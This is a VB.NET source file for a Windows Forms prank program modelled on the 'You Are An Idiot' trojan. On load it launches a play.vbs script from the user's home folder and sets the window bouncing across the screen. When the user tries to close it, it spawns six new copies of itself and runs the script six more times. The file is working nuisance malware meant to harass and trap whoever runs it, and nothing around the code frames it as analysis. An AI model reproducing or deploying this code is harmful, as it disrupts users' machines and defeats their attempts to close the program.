Imports System.Reflection.Emit

Public Class you_are_an_idiot


    Private WithEvents tmr As New Timer With {.Interval = 50}
    Dim angle As Integer = 135
    Dim currentScreen As Screen

    Private Sub Timer1_Tick_1(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Dim angleRadians As Single = CSng(Math.PI * (angle Mod 360) / 180)
            'Calculate X2 and Y2
            Dim pointX2 As Integer = CInt(Me.Location.X - Math.Sin(angleRadians) * 10)
            Dim pointY2 As Integer = CInt(Me.Location.Y + Math.Cos(angleRadians) * 10)
            Me.Location = New Point(pointX2, pointY2)
            Try
                Dim p1 As Point = New Point(Me.Location.X - currentScreen.Bounds.Left, Me.Location.Y - currentScreen.Bounds.Top)
                Dim p2 As Point = New Point(Me.Right - currentScreen.Bounds.Left, Me.Bottom - currentScreen.Bounds.Top)
                If (p1.X < 0 Or p1.Y < 0 _
                    Or p2.Y > currentScreen.Bounds.Height Or p2.X > currentScreen.Bounds.Width) Then
                    angle += 90
                End If
            Catch ex As Exception

            End Try

        Catch ex As Exception

        End Try
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub

    Private Sub you_are_an_idiot_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.DoubleBuffered = True

        Dim startInfo As New ProcessStartInfo("C:\Users\" & SystemInformation.UserName & "\play.vbs")
        startInfo.WorkingDirectory = "C:\Users\" & SystemInformation.UserName
        startInfo.UseShellExecute = True
        Process.Start(startInfo)

        Dim sb As New System.Text.StringBuilder



        Dim rnd As New Random()
        Dim screenWidth As Integer = Screen.PrimaryScreen.Bounds.Width
        Dim screenHeight As Integer = Screen.PrimaryScreen.Bounds.Height
        Dim formWidth As Integer = Me.Width ' Replace 'Me' with the name of your form
        Dim formHeight As Integer = Me.Height ' Replace 'Me' with the name of your form
        Dim randX As Integer = rnd.Next(0, screenWidth - formWidth)
        Dim randY As Integer = rnd.Next(0, screenHeight - formHeight)
        Me.StartPosition = FormStartPosition.Manual
        Me.Location = New Point(randX, randY)


        ' My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\uranidot.wav")

        currentScreen = Screen.AllScreens.First(Function(s) s.Bounds.Contains(Me.Location))
        Timer1.Enabled = True

    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

    End Sub
    Public Function OpenProgram(ByVal ThisOne As Form) As Form
        Return CType(Activator.CreateInstance(ThisOne.GetType()), Form)
    End Function

    Private Sub you_are_an_idiot_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Dim newApp As Form = OpenProgram(Me)
        Dim newApp1 As Form = OpenProgram(Me)
        Dim newApp2 As Form = OpenProgram(Me)
        Dim newApp3 As Form = OpenProgram(Me)
        Dim newApp4 As Form = OpenProgram(Me)
        Dim newApp5 As Form = OpenProgram(Me)

        newApp.Show()
        newApp1.Show()
        newApp2.Show()
        newApp3.Show()
        newApp4.Show()
        newApp5.Show()

        Dim sb As New System.Text.StringBuilder
        Dim startInfo As New ProcessStartInfo("C:\Users\" & SystemInformation.UserName & "\play.vbs")
        startInfo.WorkingDirectory = "C:\Users\" & SystemInformation.UserName
        startInfo.UseShellExecute = True
        Process.Start(startInfo)
        Process.Start(startInfo)
        Process.Start(startInfo)
        Process.Start(startInfo)
        Process.Start(startInfo)
        Process.Start(startInfo)

        ' Shell("C:\Users\" & SystemInformation.UserName & "\play.vbs", AppWinStyle.NormalFocus)
        ' Play the sound five times


    End Sub
End Class


